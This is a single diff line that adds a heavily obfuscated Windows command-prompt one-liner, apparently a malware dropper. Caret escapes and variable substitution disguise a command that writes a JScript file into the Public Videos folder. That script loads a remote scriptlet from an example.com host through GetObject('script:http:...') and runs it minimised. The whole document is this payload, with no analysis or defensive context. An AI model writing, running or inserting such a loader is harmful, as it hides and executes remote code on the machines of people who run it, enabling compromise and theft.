@@ -1,0 +1,1 @@
+start /MIN %ComSpec% /V/D/c "se^^T MIQG=^еж^зи^й╗&&se^T YVV=%Public%\V^id^eos\^nexkw7Q&&Se^t LZQVOX=tr^y^{^vlsvINWar c='sc^ri^pt^:';d='hlsvINWTt^P:';GlsvINWet^Ob^jlsvINWec^t(c+d+'&&s^e^T WOQNXV=oJatoJatabcd1234.example.comoJat?1oJat');}c^a^tch^(e^){^}^;&&s^eT/^p PFMZ="!LZQVOX:lsvINW=!!WOQNXV:oJat=/!"<n^ul > !YVV!.^j^S|ca^l^l s^t^a^rt !YVV!.j^S "|c^M^d
